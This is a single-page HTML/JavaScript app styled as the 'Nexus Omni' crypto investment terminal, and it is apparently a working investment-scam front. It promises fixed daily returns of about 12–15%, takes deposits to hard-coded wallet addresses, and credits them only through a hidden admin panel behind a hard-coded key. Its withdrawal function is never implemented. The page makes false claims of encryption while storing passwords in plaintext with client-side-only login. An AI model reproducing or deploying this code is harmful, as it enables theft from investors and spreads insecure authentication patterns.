<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Institutional Grade Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-black: #020617; }
        body { background: #f8fafc; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        /* Fixed Node Card Alignment */
        .node-card { background: #ffffff; border-radius: 24px; overflow: hidden; display: flex; align-items: center; height: 120px; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.03); }
        .node-img { width: 110px; height: 120px; object-fit: cover; }
        .node-info { padding: 0 15px; flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        
        .glass-card { background: #ffffff; border-radius: 32px; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.06); }
        .btn-prime { background: var(--nexus-black); color: #fff; border-radius: 20px; font-weight: 800; padding: 18px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .btn-prime:active { transform: scale(0.96); }
        .input-prime { background: #f1f5f9; border-radius: 18px; padding: 16px; width: 100%; border: 2px solid transparent; outline: none; transition: 0.3s; font-weight: 600; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; transition: 0.3s; flex: 1; }
        .nav-link.active { color: var(--nexus-blue); transform: translateY(-3px); }
        
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 30px; animation: slideUp 0.4s cubic-bezier(0, 1, 0.5, 1); }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 30000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .page-anim { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[9px] font-black uppercase tracking-[4px] text-slate-400">Linking Terminal...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[8px] mt-2">Institutional Platform</p>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify Identity</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">New Client? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register Profile</span></p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Set Identifier" class="input-prime">
                <input type="password" id="s-pass" placeholder="Set Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Create Vault</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">Existing? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login Now</span></p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-40">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-3xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-black text-white rounded-[20px] flex items-center justify-center text-2xl font-black shadow-lg">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span><p class="text-[9px] font-bold text-slate-400 uppercase">Vault Secured</p></div>
                </div>
            </div>
            <button onclick="logout()" class="w-11 h-11 rounded-xl bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8 page-anim">
            <div class="glass-card p-10 relative overflow-hidden bg-white border-none shadow-2xl">
                <div class="relative z-10 space-y-10">
                    <div>
                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Total Portfolio Value</p>
                        <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter text-slate-900">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end border-t border-slate-50 pt-8">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">Compounded Yield</p>
                            <p id="ui-prof" class="text-3xl font-black text-emerald-600">+$0.00</p>
                        </div>
                        <button onclick="copyRef()" class="bg-blue-600 text-white px-5 py-3 rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-lg shadow-blue-200">Share Link</button>
                    </div>
                </div>
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-blue-50 rounded-full blur-[90px]"></div>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <button onclick="showLegal('about')" class="bg-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500">Company Bio</button>
                <button onclick="showLegal('faq')" class="bg-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500">Help Center</button>
                <button onclick="showLegal('privacy')" class="bg-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500">Privacy Policy</button>
                <button onclick="showLegal('terms')" class="bg-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500">Legal Terms</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Live Node Protocols</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 space-y-6 hidden page-anim">
            <h3 class="text-sm font-black uppercase border-l-[6px] border-blue-600 pl-4">Elite Sovereignty (5)</h3>
            <div id="elite-box" class="grid gap-5"></div>
            <h3 class="text-sm font-black uppercase border-l-[6px] border-slate-200 pl-4 mt-12">Retail Protocols (12)</h3>
            <div id="retail-box" class="grid gap-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden page-anim">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Deposit</h3>
                <select id="d-asset" class="input-prime font-black" onchange="updAddr()">
                    <option value="">Asset Type</option>
                    <option value="TRX">TRX (Trust Wallet)</option>
                    <option value="ETH">ETH (Metamask)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6 border-t pt-8">
                    <div class="bg-slate-50 p-6 rounded-3xl border border-slate-100 text-center">
                        <p id="addr-txt" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="d-amt" placeholder="Deposit Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash (TID)" class="input-prime">
                    <div class="p-4 border-2 border-dashed border-slate-100 rounded-2xl text-center">
                        <input type="file" id="d-img" class="text-[10px] font-bold opacity-70">
                    </div>
                    <button onclick="sendD()" class="btn-prime shadow-xl shadow-blue-600/10">Authorize Deposit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Withdrawal</h3>
                <select id="w-gate" class="input-prime font-black">
                    <option value="">Payout Destination</option>
                    <option value="Binance">Binance Terminal</option><option value="OKX">OKX Terminal</option><option value="Trust">Trust Wallet</option><option value="Wire">Direct Bank Swift</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-addr" placeholder="Target Hash Address" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-slate-800">Process Payout</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 space-y-4 hidden page-anim">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Audit Ledger</h3>
            <div id="ledger-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass-card shadow-2xl flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-home-alt text-2xl mb-1"></i>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-2xl mb-1"></i>ASSETS</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-2xl mb-1"></i>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-history text-2xl mb-1"></i>LEDGER</div>
        </nav>
    </div>

    <div id="legal-modal" class="legal-modal">
        <div class="flex justify-between items-center mb-10">
            <h2 id="legal-h" class="text-2xl font-black uppercase tracking-tighter italic">---</h2>
            <button onclick="closeLegal()" class="text-4xl">&times;</button>
        </div>
        <div id="legal-body" class="text-sm font-medium text-slate-500 leading-relaxed space-y-6"></div>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-lg font-black uppercase tracking-widest">Master Protocol Control</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-6xl font-light">&times;</button>
        </div>
        <div id="adm-list" class="space-y-8"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = {
            elite: [
                { id: 701, name: "Omni Sovereign", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 702, name: "Omni Titan", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" },
                { id: 703, name: "Omni Prime", price: 12000, daily: 1600, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" },
                { id: 704, name: "Elite Core", price: 18000, daily: 2500, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
                { id: 705, name: "Alpha Master", price: 25000, daily: 3800, img: "https://images.unsplash.com/photo-1620321023374-d1a68fbc720d?w=400" }
            ],
            retail: Array.from({length: 12}, (_, i) => ({
                id: i+1, name: `Protocol v${i+1}`, price: 50 + (i*150), daily: 7 + (i*20), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        const legals = {
            about: "Nexus Omni is a premier decentralized asset management firm. Founded with the mission to automate wealth creation, we provide institutional-grade node protocols to retail investors globally using cutting-edge algorithmic yield technology.",
            faq: "<b>How to Withdraw?</b> Withdrawals are processed within 2-24 hours through our banking tab.<br><br><b>Is my yield fixed?</b> Yes, node yields are fixed by smart contracts at the time of deployment.",
            privacy: "We employ institutional-grade encryption for all user data. Your identifiers and transaction histories are kept in isolated private vaults. We never share data with third parties.",
            terms: "All investments in node protocols are final. Yields are generated 24/7. Nexus Omni reserves the right to terminate accounts involved in grant manipulation or fraudulent transaction audits."
        };

        window.showLegal = (t) => {
            const h = {about:"About Nexus", faq:"FAQ Center", privacy:"Privacy Policy", terms:"Legal Terms"};
            document.getElementById('legal-h').innerText = h[t];
            document.getElementById('legal-body').innerHTML = legals[t];
            document.getElementById('legal-modal').style.display = 'block';
        };
        window.closeLegal = () => document.getElementById('legal-modal').style.display = 'none';

        function renderNodes() {
            const ui = (n) => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800 tracking-tight">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">Daily Yield: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-lg font-black text-slate-900">$${n.price}</span>
                            <button onclick="deploy(${n.id})" class="bg-blue-600 text-white text-[9px] font-black px-5 py-2 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600 shadow-sm">
                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-300 font-bold mt-1">Protocol Active</p></div>
                        <span class="text-xs font-mono font-black bg-slate-50 px-5 py-2 rounded-2xl timer" data-end="${v.nextClaim}">00:00:00</span>
                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-[5px]">No Active Protocols</div>';

                const history = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-box').innerHTML = history.map(([k, h]) => `
                    <div class="glass-card p-6 flex justify-between items-center shadow-sm">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="text-[9px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</span></div>
                    </div>`).join('');
            });
        }

        window.sendD = () => {
            const f = document.getElementById('d-img').files[0];
            if(!f) return alert("Audit proof required.");
            const reader = new FileReader();
            reader.readAsDataURL(f);
            reader.onload = async () => {
                const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key;
                const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, tid: document.getElementById('d-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${key}`), req);
                await set(ref(db, `users/${uid}/history/${key}`), req);
                alert("Audit Initiated.");
                nav('ledger');
            };
        };

        // ADMIN LOGIC (4 TAPS ON LOGO)
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Nexus Protocol Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-list').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-8 space-y-6 shadow-2xl">
                        <div class="flex justify-between font-black text-[10px] uppercase"><span>Type: ${r.type} | User: ${r.user}</span><span>$${r.amount}</span></div>
                        <img src="${r.proof}" class="w-full h-64 object-cover rounded-3xl border">
                        <div class="flex gap-4">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-prime !bg-emerald-600 flex-1">Authorize</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-prime !bg-rose-600 flex-1">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-black text-slate-300">No Audits Pending</p>';
            });
        }

        window.audit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.updAddr = () => {
            const m = document.getElementById('d-asset').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('addr-txt').innerText = map[m] || "";
            document.getElementById('d-panel').classList.toggle('hidden', !m);
        };

        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.login = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Access Denied."); };
        window.signup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.href + "?ref=" + localStorage.getItem('nx_usr')); alert("Protocol Hash Copied."); };

        setInterval(() => {
            document.querySelectorAll('.timer').forEach(el => {
                const diff = parseInt(el.dataset.end) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing...";
            });
        }, 1000);
    </script>
</body>
</html>
